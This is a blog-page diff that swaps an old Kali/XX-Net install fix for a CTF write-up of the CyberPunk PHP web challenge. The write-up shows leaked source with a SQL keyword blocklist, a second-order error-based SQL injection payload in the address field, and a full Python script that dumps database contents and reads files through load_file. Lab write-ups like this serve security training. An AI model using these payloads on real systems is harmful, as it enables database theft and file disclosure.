@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>kali 安装 XX-Net openssl报错 | Rock&#39;s blog</title>
-  <meta name="keywords" content=" vpn ">
-  <meta name="description" content="kali 安装 XX-Net openssl报错 | Rock&#39;s blog">
+  <title>[CISCN2019 华北赛区 Day1 Web5]CyberPunk wp | Rock&#39;s blog</title>
+  <meta name="keywords" content=" ctf , writeup , web , sql ">
+  <meta name="description" content="[CISCN2019 华北赛区 Day1 Web5]CyberPunk wp | Rock&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="[MRCTF2020]套娃题目链接：[MRCTF2020]套娃 1.查看网页源码$query = $_SERVER[&amp;apos;QUERY_STRING&amp;apos;];   if( substr_count($query, &amp;apos;_&amp;apos;) !== 0 || substr_count($query, &amp;apos;%5f&amp;apos;) != 0 ){     die(&amp;apos;Y0u">
 <meta name="keywords" content="ctf,writeup,web,php">
@@ -336,9 +336,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-kali-XX-Net" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-CISCN2019-华北赛区-Day1-Web5-CyberPunk-wp" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">kali 安装 XX-Net openssl报错</h1>
+        <h1 class="article-title">[CISCN2019 华北赛区 Day1 Web5]CyberPunk wp</h1>
     
     <div class="article-meta">
         
@@ -347,14 +347,20 @@
         
         <span class="tag">
             
-            <a class="color4">vpn</a>
+            <a class="color4">ctf</a>
+            
+            <a class="color3">writeup</a>
+            
+            <a class="color4">web</a>
+            
+            <a class="color4">sql</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2017-09-03 11:22:03'>2017-09-03 11:21</time>
+        创建时间:<time class="date" title='更新时间: 2021-05-17 22:06:39'>2021-05-17 22:00</time>
         
     </div>
     <div class="article-meta">
@@ -376,7 +382,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XX-Net是一款开源vpn软件-通过利用GAE-Google-App-Engine-作为代理服务器-具体的安装方法请参照https-github-com-XX-net-XX-Net-上面说得很详细"><span class="toc-text">XX-Net是一款开源vpn软件.通过利用GAE(Google App Engine)作为代理服务器.具体的安装方法请参照https://github.com/XX-net/XX-Net,上面说得很详细.</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#但是kali或是debian的一些系统在安装时会发生一些问题"><span class="toc-text">但是kali或是debian的一些系统在安装时会发生一些问题.</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#当运行start文件时会报python-openssl相关的一些错误-这主要是由于pyopenssl的版本过低-与python2-7不兼容-导致无法正确导入OpenSSL包"><span class="toc-text">当运行start文件时会报python-openssl相关的一些错误,这主要是由于pyopenssl的版本过低,与python2.7不兼容.导致无法正确导入OpenSSL包.</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解决方案"><span class="toc-text">解决方案 :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#升级后的pyopenssl版本应为16-2-0"><span class="toc-text">升级后的pyopenssl版本应为16.2.0</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk"><span class="toc-text">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-查看网页源码"><span class="toc-text">1. 查看网页源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-分析后台逻辑"><span class="toc-text">2. 分析后台逻辑</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-开始注入"><span class="toc-text">2. 开始注入</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -392,8 +398,295 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="XX-Net是一款开源vpn软件-通过利用GAE-Google-App-Engine-作为代理服务器-具体的安装方法请参照https-github-com-XX-net-XX-Net-上面说得很详细"><a href="#XX-Net是一款开源vpn软件-通过利用GAE-Google-App-Engine-作为代理服务器-具体的安装方法请参照https-github-com-XX-net-XX-Net-上面说得很详细" class="headerlink" title="XX-Net是一款开源vpn软件.通过利用GAE(Google App Engine)作为代理服务器.具体的安装方法请参照https://github.com/XX-net/XX-Net,上面说得很详细."></a>XX-Net是一款开源vpn软件.通过利用GAE(<a href="appengine.google.com">Google App Engine</a>)作为代理服务器.具体的安装方法请参照<a href="https://github.com/XX-net/XX-Net" target="_blank" rel="noopener">https://github.com/XX-net/XX-Net</a>,上面说得很详细.</h2><h2 id="但是kali或是debian的一些系统在安装时会发生一些问题"><a href="#但是kali或是debian的一些系统在安装时会发生一些问题" class="headerlink" title="但是kali或是debian的一些系统在安装时会发生一些问题."></a>但是kali或是debian的一些系统在安装时会发生一些问题.</h2><h2 id="当运行start文件时会报python-openssl相关的一些错误-这主要是由于pyopenssl的版本过低-与python2-7不兼容-导致无法正确导入OpenSSL包"><a href="#当运行start文件时会报python-openssl相关的一些错误-这主要是由于pyopenssl的版本过低-与python2-7不兼容-导致无法正确导入OpenSSL包" class="headerlink" title="当运行start文件时会报python-openssl相关的一些错误,这主要是由于pyopenssl的版本过低,与python2.7不兼容.导致无法正确导入OpenSSL包."></a>当运行start文件时会报python-openssl相关的一些错误,这主要是由于pyopenssl的版本过低,与python2.7不兼容.导致无法正确导入OpenSSL包.</h2><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案 :"></a>解决方案 :</h2><pre><code>pip uninstall pyopenssl
-pip install pyopenssl</code></pre><h2 id="升级后的pyopenssl版本应为16-2-0"><a href="#升级后的pyopenssl版本应为16-2-0" class="headerlink" title="升级后的pyopenssl版本应为16.2.0"></a>升级后的pyopenssl版本应为16.2.0</h2>
+        <h1 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h1><p>题目链接：<br><a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk" target="_blank" rel="noopener">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</a></p>
+<h2 id="1-查看网页源码"><a href="#1-查看网页源码" class="headerlink" title="1. 查看网页源码"></a>1. 查看网页源码</h2><p>发现存在注释</p>
+<p><img src="images/2021-05-17-22-02-39.png" alt=""></p>
+<p>故尝试文件包含，得到源码</p>
+<p>index.php</p>
+<pre><code>//这里只把php代码贴出
+&lt;?php
+ini_set(&apos;open_basedir&apos;, &apos;/var/www/html/&apos;);
+
+// $file = $_GET[&quot;file&quot;];
+$file = (isset($_GET[&apos;file&apos;]) ? $_GET[&apos;file&apos;] : null);
+if (isset($file)){
+    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) {
+        echo(&apos;no way!&apos;);
+        exit;
+    }
+    @include($file);
+}
+?&gt;</code></pre><p>confirm.php</p>
+<pre><code>&lt;?php
+require_once &quot;config.php&quot;;
+//var_dump($_POST);
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+{
+    $msg = &apos;&apos;;
+    $pattern = &apos;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&apos;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $address = $_POST[&quot;address&quot;];
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
+        $msg = &apos;no sql inject!&apos;;
+    }else{
+        $sql = &quot;select * from `user` where `user_name`=&apos;{$user_name}&apos; and `phone`=&apos;{$phone}&apos;&quot;;
+        $fetch = $db-&gt;query($sql);
+    }
+
+    if($fetch-&gt;num_rows&gt;0) {
+        $msg = $user_name.&quot;已提交订单&quot;;
+    }else{
+        $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;
+        $re = $db-&gt;prepare($sql);
+        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);
+        $re = $re-&gt;execute();
+        if(!$re) {
+            echo &apos;error&apos;;
+            print_r($db-&gt;error);
+            exit;
+        }
+        $msg = &quot;订单提交成功&quot;;
+    }
+} else {
+    $msg = &quot;信息不全&quot;;
+}
+?&gt;</code></pre><p>search.php</p>
+<pre><code>&lt;?php
+require_once &quot;config.php&quot;; 
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+{
+    $msg = &apos;&apos;;
+    $pattern = &apos;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&apos;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
+        $msg = &apos;no sql inject!&apos;;
+    }else{
+        $sql = &quot;select * from `user` where `user_name`=&apos;{$user_name}&apos; and `phone`=&apos;{$phone}&apos;&quot;;
+        $fetch = $db-&gt;query($sql);
+    }
+
+    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
+        $row = $fetch-&gt;fetch_assoc();
+        if(!$row) {
+            echo &apos;error&apos;;
+            print_r($db-&gt;error);
+            exit;
+        }
+        $msg = &quot;&lt;p&gt;姓名:&quot;.$row[&apos;user_name&apos;].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row[&apos;phone&apos;].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row[&apos;address&apos;].&quot;&lt;/p&gt;&quot;;
+    } else {
+        $msg = &quot;未找到订单!&quot;;
+    }
+}else {
+    $msg = &quot;信息不全&quot;;
+}
+?&gt;
+
+&lt;?php global $msg; echo &apos;&lt;h2 class=&quot;mb&quot;&gt;&apos;.$msg.&apos;&lt;/h2&gt;&apos;;?&gt;</code></pre><p>change.php</p>
+<pre><code>&lt;?php
+require_once &quot;config.php&quot;;
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+{
+    $msg = &apos;&apos;;
+    $pattern = &apos;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&apos;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $address = addslashes($_POST[&quot;address&quot;]);
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
+        $msg = &apos;no sql inject!&apos;;
+    }else{
+        $sql = &quot;select * from `user` where `user_name`=&apos;{$user_name}&apos; and `phone`=&apos;{$phone}&apos;&quot;;
+        $fetch = $db-&gt;query($sql);
+    }
+
+    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
+        $row = $fetch-&gt;fetch_assoc();
+        $sql = &quot;update `user` set `address`=&apos;&quot;.$address.&quot;&apos;, `old_address`=&apos;&quot;.$row[&apos;address&apos;].&quot;&apos; where `user_id`=&quot;.$row[&apos;user_id&apos;];
+        $result = $db-&gt;query($sql);
+        if(!$result) {
+            echo &apos;error&apos;;
+            print_r($db-&gt;error);
+            exit;
+        }
+        $msg = &quot;订单修改成功&quot;;
+    } else {
+        $msg = &quot;未找到订单!&quot;;
+    }
+}else {
+    $msg = &quot;信息不全&quot;;
+}
+?&gt;</code></pre><p>delete.php</p>
+<pre><code>&lt;?php
+require_once &quot;config.php&quot;;
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+{
+    $msg = &apos;&apos;;
+    $pattern = &apos;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&apos;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
+        $msg = &apos;no sql inject!&apos;;
+    }else{
+        $sql = &quot;select * from `user` where `user_name`=&apos;{$user_name}&apos; and `phone`=&apos;{$phone}&apos;&quot;;
+        $fetch = $db-&gt;query($sql);
+    }
+
+    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
+        $row = $fetch-&gt;fetch_assoc();
+        $result = $db-&gt;query(&apos;delete from `user` where `user_id`=&apos; . $row[&quot;user_id&quot;]);
+        if(!$result) {
+            echo &apos;error&apos;;
+            print_r($db-&gt;error);
+            exit;
+        }
+        $msg = &quot;订单删除成功&quot;;
+    } else {
+        $msg = &quot;未找到订单!&quot;;
+    }
+}else {
+    $msg = &quot;信息不全&quot;;
+}
+?&gt;</code></pre><h2 id="2-分析后台逻辑"><a href="#2-分析后台逻辑" class="headerlink" title="2. 分析后台逻辑"></a>2. 分析后台逻辑</h2><p>可以看到后台对于插入、查找、修改、删除数据时提交的字段做了sql关键词的过滤，但唯独对于插入address字段时没有过滤</p>
+<p>可以考虑通过数据污染的方式进行二次注入</p>
+<p>即通过插入特殊构造的address,使之在查询或修改此字段时触发非预期sql语句执行</p>
+<p>通过分析可以看出当插入恶意address后，当更新订单时会引发sql注入</p>
+<p>插入地址为</p>
+<pre><code>&apos;,user_name=(select updatexml(1,concat(0x7e,(select @@version),0x7e),1))#</code></pre><p><img src="images/2021-05-17-22-03-30.png" alt=""></p>
+<p>修改地址<br><img src="images/2021-05-17-22-04-01.png" alt=""><br>出现报错<br><img src="images/2021-05-17-22-04-23.png" alt=""></p>
+<h1 id="2-开始注入"><a href="#2-开始注入" class="headerlink" title="2. 开始注入"></a>2. 开始注入</h1><p>为了练习所以写了一个脚本，实际做题时不需要这么麻烦。</p>
+<pre><code>import requests
+import random
+
+baseUrl = &quot;http://62226166-69f7-4a95-afca-4be78816f7f0.node3.buuoj.cn/&quot;
+tmp = str(random.randint(0,0xffffffff))
+
+# 提交订单
+def put_order(name, phone, address):
+    url = baseUrl + &quot;confirm.php&quot;
+    req = requests.post(url, data={&quot;user_name&quot;:name, &quot;phone&quot;: phone, &quot;address&quot;: address})
+    if &quot;订单提交成功&quot; in req.text:
+        return True
+    else:
+        print(&quot;put_order Error!&quot;)
+        return False
+
+# 删除订单
+def delete_order(name, phone):
+    url = baseUrl + &quot;delete.php&quot;
+    req = requests.post(url, data={&quot;user_name&quot;:name, &quot;phone&quot;:phone})
+    if &quot;订单删除成功&quot; in req.text:
+        return True
+    else:
+        print(&quot;Delete Error!&quot;)
+        return False
+
+# 修改订单
+def change_order(name, phone, address):
+    url = baseUrl + &quot;change.php&quot;
+    req = requests.post(url, data={&quot;user_name&quot;:name, &quot;phone&quot;:phone, &quot;address&quot;:address})
+    if &quot;errorXPATH syntax error:&quot; in req.text:
+        return req.text.split(&apos;~&apos;)[1]
+    else:
+        # print(&quot;change_order Error!&quot;)
+        return &quot;None&quot;
+
+# 报错注入获取数据库名
+def get_database_name():
+    start = 1
+    length = 30
+    database_name = &quot;&quot;
+    while True:
+        put_order(tmp, tmp, &quot;&apos;,user_name=(select updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),&quot;+ str(start) +&quot;,&quot;+ str(length) +&quot;),0x7e),1))#&quot;)
+        res = change_order(tmp, tmp, tmp) == &quot;None&quot;
+        res = (&quot;&quot; if res == &quot;None&quot; else res)
+        database_name += res
+        start += length
+        # print(database_name)
+        delete_order(tmp, tmp)
+        if len(res) != 30:
+            return database_name.split(&apos;,&apos;)
+
+# 报错注入获取表名
+def get_table_name(database_name):
+    start = 1
+    length = 30
+    table_name = &quot;&quot;
+    while True:
+        put_order(tmp, tmp, &quot;&apos;,user_name=(select updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;&quot;+ database_name +&quot;&apos;),&quot;+ str(start) +&quot;,&quot;+ str(length) +&quot;),0x7e),1))#&quot;)
+        res = change_order(tmp, tmp, tmp)
+        res = (&quot;&quot; if res == &quot;None&quot; else res)
+        table_name += res
+        start += length
+        delete_order(tmp, tmp)
+        if len(res) != 30:
+            return table_name.split(&apos;,&apos;)
+
+# 报错注入获取列名
+def get_columns(table_name):
+    start = 1
+    length = 30
+    column_name = &quot;&quot;
+    while True:
+        put_order(tmp, tmp, &quot;&apos;,user_name=(select updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;&quot;+ table_name +&quot;&apos;),&quot;+ str(start) +&quot;,&quot;+ str(length) +&quot;),0x7e),1))#&quot;)
+        res = change_order(tmp, tmp, tmp)
+        res = (&quot;&quot; if res == &quot;None&quot; else res)
+        column_name += res
+        start += length
+        delete_order(tmp, tmp)
+        if len(res) != 30:
+            return column_name.split(&apos;,&apos;)
+
+# 报错注入获取列中所有值
+def get_value(database_name, table_name, column_name):
+    start = 1
+    length = 30
+    value = &quot;&quot;
+    while True:
+        put_order(tmp, tmp, &quot;&apos;,user_name=(select updatexml(1,concat(0x7e,substr((select group_concat(&quot;+ column_name +&quot;) from &quot;+ database_name +&quot;.&quot;+ table_name +&quot;),&quot;+ str(start) +&quot;,&quot;+ str(length) +&quot;),0x7e),1))#&quot;)
+        res = change_order(tmp, tmp, tmp)
+        res = (&quot;&quot; if res == &quot;None&quot; else res)
+        value += res
+        start += length
+        delete_order(tmp, tmp)
+        if len(res) != 30:
+            return value.split(&apos;,&apos;)
+
+# 报错注入读取文件
+def get_file(file):
+    start = 1
+    length = 30
+    text = &quot;&quot;
+    while True:
+        put_order(tmp, tmp, &quot;&apos;,user_name=(select updatexml(1,concat(0x7e,substr(load_file(&apos;&quot;+ file +&quot;&apos;),&quot;+ str(start) +&quot;,&quot;+ str(length) +&quot;),0x7e),1))#&quot;)
+        res = change_order(tmp, tmp, tmp)
+        res = (&quot;&quot; if res == &quot;None&quot; else res)
+        text += res
+        start += length
+        delete_order(tmp, tmp)
+        if len(res) != 30:
+            return text
+
+
+
+if __name__==&quot;__main__&quot;:
+    # information_schema
+    # ctftraining
+    # mysql
+    # performance_schema
+    # test
+    # ctfusers
+    # database = &quot;ctftraining&quot;
+    # for table in get_table_name(database):
+    #     for column in get_columns(table):
+    #         print(database +&quot;.&quot;+ table +&quot;.&quot;+ column +&quot;:&quot;, end=&apos;&apos;)
+    #         print(get_value(database, table, column))
+    print(get_file(&quot;/flag.txt&quot;))</code></pre><p><img src="images/2021-05-17-22-06-32.png" alt=""></p>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以邮件至 luo_xiao_hei_718@163.com </span>
     </div>
@@ -402,12 +695,12 @@ pip install pyopenssl</code></pre><h2 id="升级后的pyopenssl版本应为16-2-
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>kali 安装 XX-Net openssl报错</p>
+    <p><span class="copy-title">文章标题:</span>[CISCN2019 华北赛区 Day1 Web5]CyberPunk wp</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="Rock">Rock</a></p>
-    <p><span class="copy-title">发布时间:</span>2017-09-03, 11:21:09</p>
-    <p><span class="copy-title">最后更新:</span>2017-09-03, 11:22:03</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2017/09/03/kali-XX-Net/" title="kali 安装 XX-Net openssl报错">https://rock718.github.io.git/2017/09/03/kali-XX-Net/</a>
+    <p><span class="copy-title">发布时间:</span>2021-05-17, 22:00:30</p>
+    <p><span class="copy-title">最后更新:</span>2021-05-17, 22:06:39</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2021/05/17/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk-wp/" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk wp">https://rock718.github.io.git/2021/05/17/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk-wp/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
